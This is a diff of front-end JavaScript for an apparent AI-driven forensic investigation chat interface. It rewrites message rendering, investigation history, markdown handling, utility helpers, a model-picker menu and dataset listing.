-        <svg class="chat-thinking-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"></polyline></svg>
-      </button>
-      <div class="chat-thinking-body"></div>
-    `;
-
-    const thinkingToggle = thinkingBlock.querySelector(".chat-thinking-toggle");
-    const thinkingBody = thinkingBlock.querySelector(".chat-thinking-body");
-    const thinkingLabel = thinkingBlock.querySelector(".chat-thinking-label");
-
-    thinkingToggle.addEventListener("click", () => {
-      thinkingBlock.classList.toggle("is-collapsed");
-    });
-
-    // 2. ChatGPT-style Tool Activity Chips Row
-    const toolsContainer = document.createElement("div");
-    toolsContainer.className = "chat-tools-container";
-    toolsContainer.style.display = "none";
-
-    // 3. Main Assistant Direct Reply (streams on the left in real-time)
-    const replyBox = document.createElement("div");
-    replyBox.className = "assistant-reply";
-    replyBox.style.display = "none";
-
-    // 4. Verdict Banner
-    const verdictBanner = document.createElement("div");
-    verdictBanner.className = "verdict-banner";
-    verdictBanner.style.display = "none";
-
-    // 5. Incident Report Container
-    const reportBox = document.createElement("div");
-    reportBox.className = "report-markdown";
-
-    // 6. Report Actions
-    const reportActions = document.createElement("div");
-    reportActions.className = "report-actions";
-    reportActions.style.display = "none";
-    reportActions.innerHTML = `
-      <button class="action-pill-btn copy-report-btn">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-        <span>Copy Report</span>
-      </button>
-    `;
-
-    // Append to message content in ChatGPT natural hierarchy:
-    content.appendChild(stepper);
-    content.appendChild(thinkingBlock);
-    content.appendChild(toolsContainer);
-    content.appendChild(hypothesesBox);
-    content.appendChild(replyBox);
-    content.appendChild(evidenceBox);
-    content.appendChild(verdictBanner);
-    content.appendChild(reportBox);
-    content.appendChild(reportActions);
-
-    row.appendChild(avatar);
-    row.appendChild(content);
-
-    const internalState = {
-      stepCount: 0,
-      thoughtText: "",
-      replyText: "",
-      reportMarkdown: "",
-      verdict: "",
-      hypotheses: [],
-      toolChips: new Map(),
-    };
-
-    const copyBtn = reportActions.querySelector(".copy-report-btn");
-    copyBtn.addEventListener("click", () => {
-      if (internalState.reportMarkdown) {
-        navigator.clipboard.writeText(internalState.reportMarkdown);
-        copyBtn.querySelector("span").textContent = "Copied!";
-        setTimeout(() => {
-          copyBtn.querySelector("span").textContent = "Copy Report";
-        }, 2000);
-      }
-    });
-
-    return {
-      container: row,
-      state: internalState,
-      setStepActive: (stepId) => {
-        const ids = ["st-prep", "st-triage", "st-loop", "st-pack", "st-report"];
-        let passed = true;
-        ids.forEach((id) => {
-          const el = stepper.querySelector("#" + id);
-          if (!el) return;
-          if (id === stepId) {
-            el.className = "step-item active";
-            passed = false;
-          } else if (passed) {
-            el.className = "step-item done";
-          } else {
-            el.className = "step-item";
-          }
-        });
-      },
-      addHypotheses: (hypos) => {
-        internalState.hypotheses = hypos;
-        hypothesesBox.style.display = "block";
-        const list = hypothesesBox.querySelector(".hypotheses-list");
-        list.innerHTML = "";
-        hypos.forEach((h, idx) => {
-          const item = document.createElement("div");
-          item.className = "hypo-item";
-          item.innerHTML = `<span class="hypo-badge">H${idx + 1}:</span><span>${escapeHtml(h)}</span>`;
-          list.appendChild(item);
-        });
-      },
-      setEvidencePack: (pack) => {
-        internalState.evidencePack = pack;
-        const timeline = Array.isArray(pack.timeline) ? pack.timeline : [];
-        latestEvidenceTimeline = timeline;
-
-        activeEvidenceHandler = {
-          toggleOrOpenTable: () => {
-            openGlobalTelemetryTable(timeline, "Retrieved Evidence Events");
-          }
-        };
-
-        const totalCount = pack.total_kept_events ?? timeline.length;
-        if (elements.headerTableBadge) {
-          elements.headerTableBadge.textContent = `${totalCount} events`;
-        }
-
-        evidenceBox.style.display = "block";
-        const countText = `${totalCount} events retained; ${pack.excluded_count ?? 0} rows filtered`;
-        const packMeta = evidenceBox.querySelector(".evidence-pack-meta");
-        if (packMeta) packMeta.textContent = countText;
-
-        const hypothesisList = evidenceBox.querySelector(".evidence-hypotheses");
-        if (hypothesisList) {
-          hypothesisList.replaceChildren();
-          Object.entries(pack.hypotheses_evidence || {}).forEach(([hypothesis, evidence]) => {
-            const rowEl = document.createElement("div");
-            rowEl.className = "evidence-hypothesis";
-            rowEl.textContent = `${evidence.event_count || 0} candidate event(s): ${hypothesis}`;
-            hypothesisList.appendChild(rowEl);
-          });
-        }
-
-        // Populate and sync Forensic Graph
-        if (timeline.length > 0) {
-          loadTimelineIntoGraph(timeline);
-        }
-      },
-      addThought: (text) => {
-        if (!text) return;
-        const cleaned = String(text)
-          .replace(/<\|?channel[^>]*\|?>/gi, "")
-          .replace(/<\/?think>/gi, "")
-          .replace(/<\/?thought>/gi, "")
-          .trim();
-        if (!cleaned) return;
-
-        thinkingBlock.style.display = "flex";
-        // Expand while actively streaming thoughts
-        if (thinkingBlock.classList.contains("is-collapsed") && !thinkingBlock.classList.contains("is-done")) {
-          thinkingBlock.classList.remove("is-collapsed");
-        }
-
-        if (cleaned.startsWith(internalState.thoughtText)) {
-          internalState.thoughtText = cleaned;
-        } else if (cleaned !== internalState.thoughtText) {
-          internalState.thoughtText = internalState.thoughtText
-            ? internalState.thoughtText + "\n\n" + cleaned
-            : cleaned;
-        }
-
-        thinkingBody.innerHTML = renderMarkdown(internalState.thoughtText) + '<span class="thinking-cursor" aria-hidden="true"></span>';
-        scrollToBottom();
-      },
-      addToolCall: (toolName, args) => {
-        toolsContainer.style.display = "flex";
-        internalState.stepCount++;
-
-        // Auto-collapse thinking block when tools begin running
-        if (!thinkingBlock.classList.contains("is-done") && internalState.thoughtText) {
-          thinkingBlock.classList.add("is-collapsed");
-        }
-
-        const chip = document.createElement("div");
-        chip.className = "tool-chip is-running";
-        const cleanName = escapeHtml(toolName || "tool");
-        chip.innerHTML = `
-          <span class="tool-chip-icon">⚡</span>
-          <span class="tool-chip-name">${cleanName}</span>
-          <span class="tool-chip-status">Running...</span>
-        `;
-        toolsContainer.appendChild(chip);
-        internalState.toolChips.set(toolName, chip);
-        scrollToBottom();
-      },
-      addToolResult: (toolName, summary) => {
-        let chip = internalState.toolChips.get(toolName);
-        if (!chip) {
-          toolsContainer.style.display = "flex";
-          chip = document.createElement("div");
-          chip.className = "tool-chip";
-          toolsContainer.appendChild(chip);
-        }
-        chip.classList.remove("is-running");
-        const cleanName = escapeHtml(toolName || "tool");
-        const cleanSummary = escapeHtml(summary || "Completed");
-        chip.innerHTML = `
-          <span class="tool-chip-icon">⚡</span>
-          <span class="tool-chip-name">${cleanName}:</span>
-          <span class="tool-chip-status">${cleanSummary}</span>
-        `;
-        chip.title = `Tool: ${toolName}\nSummary: ${summary}\nClick to view evidence`;
-        chip.onclick = () => {
-          if (latestEvidenceTimeline && latestEvidenceTimeline.length > 0) {
-            openGlobalTelemetryTable(latestEvidenceTimeline, `${toolName} Results`);
-          }
-        };
-        scrollToBottom();
-      },
-      addReply: (text) => {
-        if (!text) return;
-        const cleaned = String(text)
-          .replace(/<\|?channel[^>]*\|?>/gi, "")
-          .replace(/<\/?think>/gi, "")
-          .replace(/<\/?thought>/gi, "")
-          .trim();
-        if (!cleaned) return;
-
-        // Auto-collapse thinking block when direct reply starts
-        if (!thinkingBlock.classList.contains("is-done") && internalState.thoughtText) {
-          thinkingBlock.classList.add("is-done");
-          thinkingBlock.classList.add("is-collapsed");
-          thinkingLabel.textContent = "Thought process";
-        }
-
-        replyBox.style.display = "block";
-        if (cleaned.startsWith(internalState.replyText)) {
-          internalState.replyText = cleaned;
-        } else if (cleaned !== internalState.replyText) {
-          internalState.replyText = internalState.replyText
-            ? internalState.replyText + "\n\n" + cleaned
-            : cleaned;
-        }
-
-        replyBox.innerHTML = renderMarkdown(internalState.replyText);
-        scrollToBottom();
-      },
-      addReasoning: function (text) {
-        // Alias to addReply so agent analysis streams directly into the main message body
-        this.addReply(text);
-      },
-      addTraceStep: function (toolName, summary) {
-        // Legacy alias to addToolResult
-        this.addToolResult(toolName, summary);
-      },
-      finalizeThinking: () => {
-        if (internalState.thoughtText) {
-          thinkingBlock.classList.add("is-done");
-          thinkingBlock.classList.add("is-collapsed");
-          const stepLabel = internalState.stepCount > 0 ? ` (${internalState.stepCount} tool operations)` : "";
-          thinkingLabel.textContent = `Thought process${stepLabel}`;
-          const cursor = thinkingBody.querySelector(".thinking-cursor");
-          if (cursor) cursor.remove();
-        }
-      },
-      setVerdict: (verdict, boundary, confidence) => {
-        if (internalState.thoughtText) {
-          thinkingBlock.classList.add("is-done");
-          thinkingBlock.classList.add("is-collapsed");
-        }
-
-        const cleanVerdict = String(verdict || "inconclusive").toLowerCase().trim();
-        const confStr = formatConfidence(confidence);
-        const confVal = parseFloat(confStr) / 100;
-
-        internalState.verdict = cleanVerdict;
-        internalState.verdict_boundary = boundary || "";
-        internalState.confidence = confVal;
-
-        verdictBanner.className = `verdict-banner ${cleanVerdict}`;
-        verdictBanner.style.display = "flex";
-        verdictBanner.innerHTML = `
-          <div class="verdict-left">
-            <div class="verdict-title">${escapeHtml(cleanVerdict)}</div>
-            ${boundary ? `<div class="verdict-boundary">${escapeHtml(boundary)}</div>` : ""}
-          </div>
-          <div class="verdict-confidence">Confidence: ${confStr}</div>
-        `;
-
-        if (elements.reportStageVerdictTag) {
-          elements.reportStageVerdictTag.className = `verdict-tag ${cleanVerdict}`;
-          elements.reportStageVerdictTag.textContent = `Verdict: ${cleanVerdict.toUpperCase()}`;
-        }
-        if (elements.reportStageVerdictTime) {
-          elements.reportStageVerdictTime.textContent = `Confidence: ${confStr} ${boundary ? '· ' + boundary : ''}`;
-        }
-      },
-      setReport: (markdown) => {
-        if (internalState.thoughtText) {
-          thinkingBlock.classList.add("is-done");
-          thinkingBlock.classList.add("is-collapsed");
-        }
-
-        internalState.reportMarkdown = markdown;
-        const rendered = renderMarkdown(markdown);
-        reportBox.innerHTML = rendered;
-        reportActions.style.display = "flex";
-
-        if (elements.reportStageContent) {
-          elements.reportStageContent.innerHTML = rendered;
-        }
-        scrollToBottom(true);
-      },
-      setErrorMessage: (msg) => {
-        if (internalState.thoughtText) {
-          thinkingBlock.classList.add("is-done");
-          thinkingBlock.classList.add("is-collapsed");
-        }
-        reportBox.innerHTML = `<div style="color:var(--verdict-malicious-text); padding:10px; background:var(--verdict-malicious-bg); border-radius:8px;">⚠️ ${escapeHtml(msg)}</div>`;
-      },
-    };
-  }
-
-  function handleStreamEvent(event, assistantMsg) {
-    switch (event.type) {
-      case "start":
-        assistantMsg.setStepActive("st-prep");
-        break;
-
-      case "alert_prep":
-        assistantMsg.setStepActive("st-triage");
-        break;
-
-      case "triage":
-        assistantMsg.setStepActive("st-loop");
-        if (event.data && event.data.hypotheses) {
-          assistantMsg.addHypotheses(event.data.hypotheses);
-        }
-        break;
-
-      case "loop":
-        assistantMsg.setStepActive("st-loop");
-        break;
-
-      case "evidence_pack":
-        assistantMsg.setStepActive("st-pack");
-        assistantMsg.setEvidencePack(event.data || {});
-        break;
-
-      case "tool_call":
-        const tc = event.data || {};
-        assistantMsg.addToolCall(tc.tool, tc.args);
-        break;
-
-      case "tool_result":
-        assistantMsg.addToolResult(event.data?.tool, event.data?.summary);
-        break;
-
-      case "thought":
-        assistantMsg.addThought(event.text);
-        break;
-
-      case "reasoning":
-        assistantMsg.addReply(event.text);
-        break;
-
-      case "complete":
-        assistantMsg.setStepActive("st-report");
-        assistantMsg.finalizeThinking();
-        const res = event.data;
-        if (res.verdict) {
-          assistantMsg.setVerdict(
-            res.verdict,
-            res.verdict_boundary,
-            res.confidence || 0.0
-          );
-        }
-        if (res.report) {
-          assistantMsg.setReport(res.report);
-        }
-        // Ensure activeEvidenceHandler and top bar button are hooked to the latest evidence
-        if (assistantMsg.state?.evidencePack?.timeline) {
-          latestEvidenceTimeline = assistantMsg.state.evidencePack.timeline;
-          activeEvidenceHandler = {
-            toggleOrOpenTable: () => {
-              openGlobalTelemetryTable(latestEvidenceTimeline, "Retrieved Evidence Events");
-            }
-          };
-          if (elements.headerTableBadge) {
-            elements.headerTableBadge.textContent = `${latestEvidenceTimeline.length} events`;
-          }
-        }
-        scrollToBottom(true);
-        break;
-
-      case "error":
-        assistantMsg.setErrorMessage(event.message || "An unexpected error occurred.");
-        break;
-    }
-    scrollToBottom(false);
-  }
-
-  // -------------------------------------------------------------------------
-  // Local History Management
-  // -------------------------------------------------------------------------
-  function loadSavedHistory() {
-    try {
-      const raw = localStorage.getItem("a1_dfir_history");
-      if (raw) {
-        state.history = JSON.parse(raw);
-        renderHistoryList();
-      }
-    } catch (e) {
-      console.warn("Could not load history", e);
-    }
-  }
-
-  function saveInvestigationSession(id, query, sessionState) {
-    const item = {
-      id: id,
-      query: query,
-      timestamp: Date.now(),
-      verdict: sessionState.verdict,
-      verdict_boundary: sessionState.verdict_boundary || "",
-      confidence: sessionState.confidence || 0.85,
-      report: sessionState.reportMarkdown,
-      model: state.activeModel,
-      db: state.currentDb,
-      hypotheses: sessionState.hypotheses,
-      evidencePack: sessionState.evidencePack,
-    };
-    state.history.unshift(item);
-    if (state.history.length > 25) state.history.pop();
-    try {
-      localStorage.setItem("a1_dfir_history", JSON.stringify(state.history));
-      renderHistoryList();
-    } catch (e) {
-      console.warn("Could not save history to localStorage", e);
-    }
-  }
-
-  function renderHistoryList() {
-    elements.historyList.innerHTML = "";
-    if (state.history.length === 0) {
-      elements.historyList.innerHTML = `<div class="history-empty">No previous investigations</div>`;
-      return;
-    }
-
-    state.history.forEach((item) => {
-      const el = document.createElement("div");
-      el.className = "history-item" + (item.id === state.currentSessionId ? " active" : "");
-
-      const span = document.createElement("span");
-      span.textContent = item.query;
-      span.title = item.query;
-
-      const delBtn = document.createElement("button");
-      delBtn.className = "history-del-btn";
-      delBtn.innerHTML = "×";
-      delBtn.title = "Delete this investigation";
-      delBtn.onclick = (e) => {
-        e.stopPropagation();
-        deleteHistoryItem(item.id);
-      };
-
-      el.appendChild(span);
-      el.appendChild(delBtn);
-
-      el.onclick = () => loadHistoryItem(item);
-      elements.historyList.appendChild(el);
-    });
-  }
-
-  function deleteHistoryItem(id) {
-    state.history = state.history.filter((h) => h.id !== id);
-    localStorage.setItem("a1_dfir_history", JSON.stringify(state.history));
-    renderHistoryList();
-    if (state.currentSessionId === id) startNewChat();
-  }
-
-  function clearAllHistory() {
-    if (!confirm("Clear all recent investigation history?")) return;
-    state.history = [];
-    localStorage.removeItem("a1_dfir_history");
-    renderHistoryList();
-  }
-
-  function loadHistoryItem(item) {
-    startNewChat();
-    state.currentSessionId = item.id;
-    renderHistoryList();
-
-    elements.welcomeScreen.style.display = "none";
-    renderUserMessage(item.query);
-
-    const assistantMsg = createAssistantMessageElement();
-    elements.messagesContainer.appendChild(assistantMsg.container);
-
-    if (item.hypotheses && item.hypotheses.length) {
-      assistantMsg.addHypotheses(item.hypotheses);
-    }
-    if (item.evidencePack) {
-      assistantMsg.setEvidencePack(item.evidencePack);
-      const timeline = Array.isArray(item.evidencePack.timeline) ? item.evidencePack.timeline : [];
-      latestEvidenceTimeline = timeline;
-      activeEvidenceHandler = {
-        toggleOrOpenTable: () => {
-          openGlobalTelemetryTable(timeline, "Retrieved Evidence Events");
-        }
-      };
-      if (elements.headerTableBadge) {
-        elements.headerTableBadge.textContent = `${item.evidencePack.total_kept_events ?? timeline.length} events`;
-      }
-    }
-    if (item.verdict) {
-      assistantMsg.setVerdict(item.verdict, item.verdict_boundary || "", item.confidence || 0.85);
-    }
-    if (item.report) {
-      assistantMsg.setReport(item.report);
-    }
-    assistantMsg.setStepActive("st-report");
-    scrollToBottom();
-  }
-
-  // -------------------------------------------------------------------------
-  // Helpers: Markdown Renderer & Utilities
-  // -------------------------------------------------------------------------
-  function formatConfidence(conf) {
-    if (conf === null || conf === undefined) return "85%";
-    let val = conf;
-    if (typeof val === "string") {
-      val = parseFloat(val.replace("%", "").trim());
-    }
-    if (typeof val !== "number" || isNaN(val)) {
-      return "85%";
-    }
-    if (val > 1) {
-      val = val / 100;
-    }
-    val = Math.max(0.05, Math.min(1.0, val));
-    return `${Math.round(val * 100)}%`;
-  }
-
-  function normalizeMarkdown(text) {
-    if (!text) return "";
-    let s = String(text);
-
-    // 1. Separate headers like "text. ### Header" -> "text.\n\n### Header"
-    s = s.replace(/([^\n])\s*(#{1,4}\s+[^\n]+)/g, "$1\n\n$2\n\n");
-
-    // 2. Separate major key markers like "**Forensic Thinking:**", "**Action:**", "**Conclusion:**", "**Final Assessment:**"
-    s = s.replace(/([^\n])\s*(\*\*(?:Forensic Thinking|Action|Tool Call|Conclusion|Final Assessment):?\*\*)/gi, "$1\n\n$2\n");
-
-    // 3. Separate numbered lists stuck inside sentences like "text. 1. **Title**:" -> "text.\n\n1. **Title**:"
-    s = s.replace(/([^\n])\s+(\d+\.\s+\*\*)/g, "$1\n\n$2");
-    s = s.replace(/([^\n])\s+(\d+\.\s+[A-Z])/g, "$1\n\n$2");
-
-    // 4. Separate bullet items stuck like "* item * item"
-    s = s.replace(/([^\n])\s+(\*\s+`)/g, "$1\n* $2");
-    s = s.replace(/([^\n])\s+(\*\s+\*\*)/g, "$1\n* $2");
-
-    return s;
-  }
-
-  function renderMarkdown(mdText) {
-    if (!mdText) return "";
-    const normalized = normalizeMarkdown(mdText);
-    
-    // Check for marked in window (from vendor or CDN)
-    if (window.marked) {
-      try {
-        const rawHtml = typeof window.marked.parse === "function" 
-          ? window.marked.parse(normalized) 
-          : window.marked(normalized);
-        if (window.DOMPurify && typeof window.DOMPurify.sanitize === "function") {
-          return window.DOMPurify.sanitize(rawHtml);
-        }
-        return rawHtml;
-      } catch (e) {
-        console.warn("marked.parse failed, falling back to local renderer:", e);
-      }
-    }
-
-    // Built-in Lightweight Markdown Fallback (100% offline reliable)
-    let html = escapeHtml(normalized);
-
-    // Code blocks ```...```
-    html = html.replace(/```(?:[a-zA-Z0-9_-]+)?\n([\s\S]*?)```/g, function (match, p1) {
-      return `<pre><code>${p1}</code></pre>`;
-    });
-    html = html.replace(/```([\s\S]*?)```/g, function (match, p1) {
-      return `<pre><code>${p1}</code></pre>`;
-    });
-
-    // Inline code `...`
-    html = html.replace(/`([^`]+)`/g, "<code>$1</code>");
-
-    // Headers
-    html = html.replace(/^### (.*$)/gim, "<h3>$1</h3>");
-    html = html.replace(/^## (.*$)/gim, "<h2>$1</h2>");
-    html = html.replace(/^# (.*$)/gim, "<h1>$1</h1>");
-
-    // Bold & Italic
-    html = html.replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>");
-    html = html.replace(/\*([^*]+)\*/g, "<em>$1</em>");
-
-    // Blockquotes
-    html = html.replace(/^\> (.*$)/gim, "<blockquote>$1</blockquote>");
-
-    // Ordered lists
-    html = html.replace(/^\d+\.\s+(.*$)/gim, "<li>$1</li>");
-
-    // Unordered lists
-    html = html.replace(/^[\-\*]\s+(.*$)/gim, "<li>$1</li>");
-
-    // Wrap consecutive list items
-    html = html.replace(/(<li>(?:(?!<\/li>)[\s\S])*?<\/li>(\s*<li>(?:(?!<\/li>)[\s\S])*?<\/li>)*)/gim, "<ul>$1</ul>");
-
-    // Paragraphs
-    html = html.replace(/\n\n+/g, "<br><br>");
-
-    return html;
-  }
-
-  function escapeHtml(text) {
-    if (text === null || text === undefined) return "";
-    return String(text)
+  function escapeHtml(s) {
+    return String(s == null ? "" : s)
       .replace(/&/g, "&amp;")
       .replace(/</g, "&lt;")
       .replace(/>/g, "&gt;")
       .replace(/"/g, "&quot;")
-      .replace(/'/g, "&#039;");
+      .replace(/'/g, "&#39;");
   }
 
-  function scrollToBottom(force = false) {
-    if (!elements.chatStage) return;
-    const threshold = 220;
-    const isNearBottom =
-      elements.chatStage.scrollHeight - elements.chatStage.scrollTop - elements.chatStage.clientHeight <= threshold;
-    if (force || isNearBottom) {
-      elements.chatStage.scrollTo({
-        top: elements.chatStage.scrollHeight,
-        behavior: force ? "smooth" : "auto",
-      });
+  function pad(n) {
+    return n < 10 ? "0" + n : String(n);
+  }
+
+  function fmtClock(iso) {
+    var d = new Date(iso);
+    if (isNaN(d.getTime())) return String(iso || "").slice(11, 19);
+    return pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds());
+  }
+
+  function fmtShort(iso) {
+    var d = new Date(iso);
+    if (isNaN(d.getTime())) return String(iso || "").slice(0, 19);
+    return pad(d.getDate()) + " " + d.toLocaleString("en", { month: "short" }) + " " + pad(d.getHours()) + ":" + pad(d.getMinutes());
+  }
+
+  function fmtBytes(n) {
+    n = Number(n) || 0;
+    if (!n) return "";
+    if (n > 1024 * 1024) return (n / 1024 / 1024).toFixed(1) + " MB";
+    if (n > 1024) return Math.round(n / 1024) + " KB";
+    return n + " B";
+  }
+
+  function debounce(fn, ms) {
+    var t;
+    return function () {
+      var args = arguments;
+      clearTimeout(t);
+      t = setTimeout(function () {
+        fn.apply(null, args);
+      }, ms);
+    };
+  }
+
+  function clip(s, n) {
+    s = String(s == null ? "" : s);
+    return s.length > n ? s.slice(0, n - 1) + "…" : s;
+  }
+
+  var toastTimer;
+  function toast(msg, kind) {
+    var t = els.toast;
+    t.textContent = msg;
+    t.dataset.kind = kind || "info";
+    t.classList.add("is-on");
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function () {
+      t.classList.remove("is-on");
+    }, kind === "error" ? 6000 : 3200);
+  }
+
+  async function copyText(text, label) {
+    try {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        await navigator.clipboard.writeText(text);
+      } else {
+        var ta = document.createElement("textarea");
+        ta.value = text;
+        ta.style.position = "fixed";
+        ta.style.opacity = "0";
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand("copy");
+        document.body.removeChild(ta);
+      }
+      toast((label || "Copied") + " to clipboard");
+      return true;
+    } catch (e) {
+      toast("Clipboard blocked by the browser", "error");
+      return false;
     }
   }
 
-  function formatBytes(bytes) {
-    if (!bytes || bytes === 0) return "0 B";
-    const k = 1024;
-    const sizes = ["B", "KB", "MB", "GB"];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + " " + sizes[i];
+  async function api(path, opts) {
+    opts = opts || {};
+    var res;
+    try {
+      res = await fetch(path, opts);
+    } catch (e) {
+      throw new Error("Cannot reach the A1 backend — is the server running?");
+    }
+    var text = await res.text();
+    var body = null;
+    if (text) {
+      try {
+        body = JSON.parse(text);
+      } catch (e) {
+        body = null;
+      }
+    }
+    if (!res.ok) {
+      var detail = (body && (body.detail || body.error)) || text || res.statusText;
+      if (typeof detail !== "string") detail = JSON.stringify(detail);
+      throw new Error(detail + " (HTTP " + res.status + ")");
+    }
+    return body;
   }
 
-  // Run initialization
-  document.addEventListener("DOMContentLoaded", init);
+  function dbLabel(path) {
+    if (!path) return "";
+    var parts = String(path).split(/[\\/]/);
+    return parts[parts.length - 1] || path;
+  }
+
+  function hostOfEvent(e) {
+    var d = e.details || {};
+    return d["host.name"] || d["host.hostname"] || d["agent.name"] || d["agent_name"] || e.host_id || "";
+  }
+
+  function eventTime(e) {
+    return e.timestamp || (e.details && (e.details["@timestamp"] || e.details.timestamp)) || "";
+  }
+
+  // ---------------------------------------------------------------- model menu
+
+  function setModelMenu(open) {
+    els.modelMenu.hidden = !open;
+    els.modelSelectorPill.setAttribute("aria-expanded", String(open));
+    if (open) {
+      setCaseMenu(false);
+      renderModelList();
+      setTimeout(function () {
+        els.modelSearchInput.value = "";
+        els.modelSearchInput.focus();
+      }, 0);
+    }
+  }
+
+  function modelMenuOpen() {
+    return !els.modelMenu.hidden;
+  }
+
+  function providerLabel(p) {
+    return { opencode: "OpenCode", ollama: "Ollama", openai: "OpenAI" }[p] || p;
+  }
+
+  function renderModelList() {
+    var q = els.modelSearchInput.value.trim().toLowerCase();
+    var list = state.models[state.modelTab] || [];
+    var items = list.filter(function (m) {
+      return !q || m.toLowerCase().indexOf(q) >= 0;
+    });
+    if (!items.length) {
+      els.modelList.innerHTML = '<p class="menu-note">No models listed for ' + escapeHtml(providerLabel(state.modelTab)) + ".</p>";
+      return;
+    }
+    els.modelList.innerHTML = items
+      .map(function (m) {
+        var active = m === state.model && state.provider === state.modelTab;
+        return (
+          '<button class="model-item' + (active ? " is-active" : "") + '" role="option" aria-selected="' + active + '" data-model="' +
+          escapeHtml(m) + '"><span>' + escapeHtml(m) + "</span>" +
+          (active ? '<span class="model-item-tag">active</span>' : "") +
+          "</button>"
+        );
+      })
+      .join("");
+  }
+
+  function setProviderTab(p) {
+    state.modelTab = p;
+    Array.prototype.forEach.call(els.providerTabs.querySelectorAll(".seg-btn"), function (b) {
+      b.classList.toggle("is-active", b.dataset.provider === p);
+    });
+    renderModelList();
+  }
+
+  function updateModelUI() {
+    var label = state.model || "select model";
+    els.activeModelName.textContent = label;
+    els.activeProviderBadge.textContent = state.provider || "—";
+    els.composerModel.textContent = state.provider ? state.provider + "/" + state.model : "no model";
+    els.modelSelectorPill.title = "Model: " + label + " (" + (state.provider || "unset") + ")";
+  }
+
+  async function setModel(provider, model) {
+    if (!provider || !model) return;
+    try {
+      await api("/api/models/set", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ provider: provider, model: model }),
+      });
+      state.provider = provider;
+      state.model = model;
+      updateModelUI();
+      renderModelList();
+      setModelMenu(false);
+      toast("Model set to " + provider + "/" + model);
+    } catch (e) {
+      toast("Could not set model: " + e.message, "error");
+    }
+  }
+
+  // ---------------------------------------------------------------- datasets
+
+  function setCaseMenu(open) {
+    els.caseMenu.hidden = !open;
+    els.caseBtn.setAttribute("aria-expanded", String(open));
+    if (open) setModelMenu(false);
+  }
+
+  function caseMenuOpen() {
+    return !els.caseMenu.hidden;
+  }
+
+  function renderDatabases() {
+    els.dbList.innerHTML = state.databases
+      .map(function (db) {
+        var path = db.path || db;
+        var name = db.name || dbLabel(path);
+        var active = path === state.dbPath;
+        return (
+          '<button class="db-row' + (active ? " is-active" : "") + '" data-db="' + escapeHtml(path) + '" title="' + escapeHtml(path) + '">' +
+          '<span class="db-name">' + escapeHtml(name) + "</span>" +
+          '<span class="db-size">' + escapeHtml(fmtBytes(db.size_bytes)) + "</span>" +
+          (active ? '<span class="db-current">current</span>' : "") +
+          "</button>"
+        );
+      })
+      .join("") || '<p class="menu-note">No datasets found.</p>';
+  }
+
+  function hostList() {
+    var hosts = new Set();
+    state.events.forEach(function (e) {
+      var h = hostOfEvent(e);
+      if (h) hosts.add(h);
+    });
+    return Array.from(hosts);
+  }
+
+  function spanLabel() {
+    var times = state.events.map(eventTime).filter(Boolean).sort();
+    if (!times.length) return "";
+    var a = new Date(times[0]);
+    var b = new Date(times[times.length - 1]);
+    if (isNaN(a.getTime()) || isNaN(b.getTime())) return "";
+    var day = function (d) {
+      return pad(d.getDate()) + " " + d.toLocaleString("en", { month: "short" });
+    };
+    if (day(a) === day(b)) return day(a) + " " + pad(a.getHours()) + ":" + pad(a.getMinutes()) + " → " + pad(b.getHours()) + ":" + pad(b.getMinutes());
+    return day(a) + " " + pad(a.getHours()) + ":" + pad(a.getMinutes()) + " → " + day(b) + " " + pad(b.getHours()) + ":" + pad(b.getMinutes());
+  }
+
+  function setDbChrome() {
+    var name = dbLabel(state.dbPath);
+    els.headerDbName.textContent = name || "no dataset";
+    els.headerDbName.parentElement.title = state.dbPath || "No dataset selected";
+    els.composerDb.textContent = name || "no dataset";
+    var bits = [];
+    if (state.eventTotal) bits.push(state.eventTotal.toLocaleString() + " events");
+    var hosts = hostList();
+    if (hosts.length) bits.push(hosts.length + (hosts.length === 1 ? " host" : " hosts"));
+    var span = spanLabel();
+    if (span) bits.push(span);
+    els.headerDbMeta.textContent = bits.join(" · ");
+    els.dbHint.textContent = state.events.length
+      ? "indexed " + state.events.length.toLocaleString() + " of " + state.eventTotal.toLocaleString()
+      : "no readable events";
+  }
+
+  function updateEmpty() {
+    var name = dbLabel(state.dbPath);
+    els.emptyTitle.textContent = name || "no dataset";
+    var bits = [];
+    if (state.eventTotal) bits.push(state.eventTotal.toLocaleString() + " events");
+    var hosts = hostList();
+    if (hosts.length) bits.push(hosts.length + (hosts.length === 1 ? " host" : " hosts"));
+    var span = spanLabel();
+    if (span) bits.push(span);
+    els.emptyMeta.textContent = bits.join(" · ");
+  }
+
+  function renderExamples() {
+    var name = dbLabel(state.dbPath);
+    var items = SCENARIOS.filter(function (s) {
+      return s.db === name;
+    });
+    els.examplesEmpty.hidden = items.length > 0;
+    els.suggestionsList.innerHTML = items
+      .map(function (s, i) {
+        return (
+          '<button class="example" data-example="' + i + '">' +
+          '<span class="ex-code">' + escapeHtml(s.code) + "</span>" +
+          '<span class="ex-body"><span class="ex-title">' + escapeHtml(s.title) + "</span>" +
+          '<span class="ex-meta">' + escapeHtml(s.host) + " · " + escapeHtml(s.category) + "</span></span>" +
+          "</button>"
+        );
+      })
+      .join("");
+    els.suggestionsList.dataset.db = name;
+    state.exampleItems = items;
+  }
+
+  async function loadEvents() {
+    try {
+      var data = await api("/api/events?limit=2500");
+      if (data && data.error) throw new Error(data.error);
+      state.events = (data && data.events) || [];
+      state.eventTotal = (data && data.total) || state.events.length;
+      state.scopeEventIds = null;
+      rebuildGraph();
+      renderTelemetryTable();
+      setDbChrome();
+      updateEmpty();
+    } catch (e) {
+      state.events = [];
+      state.eventTotal = 0;
+      state.scopeEventIds = null;
+      state.graphData = { nodes: [], edges: [], meta: {} };
+      state.nodeById = new Map();
+      renderLegend();
+      renderMap();
+      renderTelemetryTable();
+      setDbChrome();
